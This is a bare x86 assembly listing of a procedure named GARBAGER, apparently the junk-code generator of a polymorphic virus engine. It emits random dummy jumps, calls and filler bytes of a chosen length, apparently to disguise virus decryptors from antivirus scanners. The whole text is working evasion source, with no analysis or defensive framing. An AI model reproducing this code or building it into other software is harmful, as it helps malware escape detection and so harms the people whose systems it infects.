GARBAGER	Proc			;start of garbager code
i1	pushad
i3	mov	edi,esi
i3	sub	edi,ecx
i3	mov	eax,[ebp+garbage_wrap-gdelta+(ecx*4)]
i3	add	eax,ebp
i2	call	eax			;call routine in dependency of the length
end_GARBAGER:
i1	popad
e_GRB:
i1	ret

GRB9:					;9-byte garbage
i2	push	2
i2	call	RANDOM			;get rnd number <0,1>
i2	dec	eax
i2	je	@grb91
i2	call	GRB1
i2	jmp	GRB8
@grb91:
i2	call	GRB8
i2	jmp	GRB1

GRB8:					;8-byte garbage
i2	push	2
i2	call	RANDOM			;get rnd number <0,1>
i2	dec	eax
i2	je	@grb81
i3	mov	eax,02E8h		;create CALL	@1
i1	stosd				;	JMP	@2
i3	mov	eax,0C301EB00h		;@1:	RET
i1	stosd				;@2:	...
i1	ret
@grb81:
i2	call	GRB4
i2	jmp	GRB4

GRB7:					;7-byte garbage
i2	push	4
i2	call	RANDOM			;get rnd number <0,3>
i2	dec	eax
i2	je	@grb71
i2	dec	eax
i2	je	@grb72
i2	dec	eax
i2	je	@grb73
i2	call	GRB3
i2	jmp	GRB4
@grb71:
i2	call	GRB6
i2	jmp	GRB1
@grb72:
i2	call	GRB1
i2	jmp	GRB6
@grb73:
i2	call	GRB4
i2	jmp	GRB3

GRB6:					;6-byte garbage
i2	push	5
i2	call	RANDOM			;get rnd number <0,3>
i2	dec	eax
i2	je	@grb61
i2	dec	eax
i2	je	@grb62
i2	dec	eax
i2	je	@grb63
i2	dec	eax
i2	je	@grb64
i3	mov	eax,02EB02EBh		;create JMP	@1
i1	stosd				;@3:	JMP	@2
i3	mov	al,0EBh			;@1:	JMP	@3
i1	stosb				;@2:	...
i3	mov	al,-4
i1	stosb
i1	ret
@grb61:	
i2	call	GRB5
i2	jmp	GRB1
@grb62:
i2	call	GRB1
i2	jmp	GRB5
@grb63:
i2	call	GRB3
i2	jmp	GRB3
@grb64:
i2	push	5
i2	call	RANDOM
i3	imul	eax,6
i3	lea	esi,[ebp+grb6-gdelta+eax]
i1	movsb
i2	push	8
i2	call	RANDOM
i3	xchg	eax,edx
i1	lodsb
i3	add	al,dl
i1	stosb
i1	movsd
i1	ret



GRB5:					;5-byte garbage
i2	push	3
i2	call	RANDOM			;get rnd number <0,2>
i2	dec	eax
i2	je	@grb51
i2	dec	eax
i2	je	@grb52
i3	mov	eax,0E9h
i1	stosd
i3	xor	eax,eax
i1	stosb
i1	ret
@grb52:
i2	call	GRB4
i2	jmp	GRB1
@grb51:
i2	call	GRB1
i2	jmp	GRB4

GRB4:					;4-byte garbage
i2	push	4
i2	call	RANDOM			;get rnd number <0,3>
i2	dec	eax
i2	je	@grb41
i2	dec	eax
i2	je	@grb42
i2	dec	eax
i2	je	@grb43
i3	mov	al,0EBh			;create JMP	@1
i1	stosb				;	DW	XXXX
i3	mov	al,2			;@1:	...
i1	stosb
i2	push	-1
i2	call	RANDOM			;get rnd number <0,0FFFFFFFFh>
i1	stosw
i1	ret
@grb41:
i2	call	GRB2
i2	jmp	GRB2
@grb42:
i2	call	GRB1
i2	jmp	GRB3
@grb43:
i2	call	GRB3
i2	jmp	GRB1

GRB3:					;3-byte garbage
i2	push	5
i2	call	RANDOM			;get rnd number <0,3>
i2	dec	eax
i2	je	@grb31
i2	dec	eax
i2	je	@grb32
i2	dec	eax
i2	je	@grb33
i2	dec	eax
i2	je	@grb34
i3	mov	al,0EBh			;create JMP	@1
i1	stosb				;	DB	XX
i3	mov	al,1			;@1:	...
i1	stosb
i2	push	-1
i2	call	RANDOM			;get rnd number <0,0FFFFFFFFh>
i1	stosb
i1	ret
@grb31:
i2	call	GRB1
i2	call	GRB1
i2	jmp	GRB1
@grb32:
i2	call	GRB2
i2	jmp	GRB1
@grb33:
i2	call	GRB1
i2	jmp	GRB2
@grb34:
i2	push	5
i2	call	RANDOM
i3	imul	eax,3
i3	lea	esi,[ebp+grb3-gdelta+eax]
i1	movsb
i2	push	8
i2	call	RANDOM
i3	xchg	eax,edx
i1	lodsb
i3	add	al,dl
i1	stosb
i1	movsb
i1	ret

GRB2:					;2-byte garbage
i2	push	2
i2	call	RANDOM			;get rnd number <0,1>
i2	dec	eax
i2	je	@grb2
i2	call	GRB1
i2	jmp	GRB1
@grb2:
i2	push	28
i2	call	RANDOM			;get rnd number <0,27>
i3	lea	esi,[ebp+grb2-gdelta+(eax*2)]
i1	movsw				;copy 2 bytez
i1	ret
GRB1:
i2	push	6
i2	call	RANDOM			;get rnd number <0,5>
i3	lea	esi,[ebp+grb1-gdelta+eax]
i1	movsb				;copy 1 byte
i1	ret
GARBAGER	EndP
